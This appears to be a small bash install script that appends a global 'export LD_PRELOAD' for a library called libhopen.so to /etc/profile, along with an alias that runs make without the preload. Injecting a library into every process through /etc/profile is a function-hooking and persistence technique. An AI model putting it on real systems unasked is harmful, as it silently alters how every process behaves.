#!/usr/bin/bash
egrep -r "^export LD_PRELOAD=" /etc/profile
if [ $? == 1 ]; then
    echo "export LD_PRELOAD=`pwd`/libhopen.so" >> /etc/profile
fi

egrep -r "^alias make=\"LD_PRELOAD=\"\" make\"" /etc/profile
if [ $? == 1 ]; then
    echo "alias make=\"LD_PRELOAD=\"\" make\"" >> /etc/profile
fi
